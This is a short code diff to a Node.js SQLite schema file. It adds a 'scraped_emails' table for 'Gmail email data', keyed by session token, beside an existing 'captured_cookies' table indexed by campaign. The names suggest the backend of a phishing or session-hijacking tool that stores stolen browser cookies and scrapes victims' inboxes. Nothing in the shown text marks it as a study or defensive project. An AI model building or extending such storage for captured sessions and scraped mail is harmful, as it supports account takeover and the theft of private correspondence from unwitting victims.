@@ -368,6 +368,29 @@ db.serialize(() => {
     ON captured_cookies(campaign_id, is_active)
   `);
 
+  // Create scraped emails table for Gmail email data
+  db.run(`
+    CREATE TABLE IF NOT EXISTS scraped_emails (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      session_token TEXT NOT NULL,
+      email_id TEXT NOT NULL,
+      sender TEXT,
+      subject TEXT,
+      date TEXT,
+      snippet TEXT,
+      is_unread INTEGER DEFAULT 0,
+      scraped_at DATETIME,
+      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+      UNIQUE(session_token, email_id)
+    )
+  `);
+
+  // Create index for faster email lookups
+  db.run(`
+    CREATE INDEX IF NOT EXISTS idx_scraped_emails_session 
+    ON scraped_emails(session_token, created_at DESC)
+  `);
+
   // Log table creation success
   console.log('Tracking tables initialized');
 });
